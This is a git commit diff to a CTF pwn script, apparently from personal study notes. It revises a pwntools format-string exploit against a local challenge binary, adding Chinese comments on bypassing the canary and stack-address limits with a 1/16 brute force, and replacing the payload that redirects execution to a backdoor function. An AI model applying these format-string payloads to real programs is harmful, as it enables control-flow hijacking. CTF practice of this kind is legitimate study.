6f7e67e6674e90eaa54eeb283c50550a93773cc3
wgf4242 <wgf4242@gmail.com>
2024-03-04 09:32:47 +0800

    sync

--- docs/ctf/scripts/pwn/pwn_02_fmt_12_不能用ps_栈迁移.py
+++ docs/ctf/scripts/pwn/pwn_02_fmt_12_不能用ps_栈迁移.py
@@ -7,15 +7,17 @@
     printf(s);
 '''
 # old ebp在第18个位置，修改这个地址，然后在栈里面写入sys的地址。
-from pwn import *
+# 这个题不能泄漏stack地址并且开启了canary保护，这样就需要利残留在stack上的地址，
+## 通过修改残留的栈地址并且1/16的爆破从成功劫持程序流到后⻔函数
 
+from pwn import *
 context.arch = "amd64"
 context.log_level = "debug"
 
 p = process("./vuln")
-# p = remote("47.100.137.175",31349)
 
-payload = b'%72c%18$hhnaaaaa' + p64(0x40123D) * 6
+payload = "%88c%18$hhn%4198885c%22$ln"
+# payload2 = b'%72c%18$hhnaaaaa' + p64(0x40123D) * 6
 p.sendafter(b'M3?\n', payload)
 
 p.interactive()
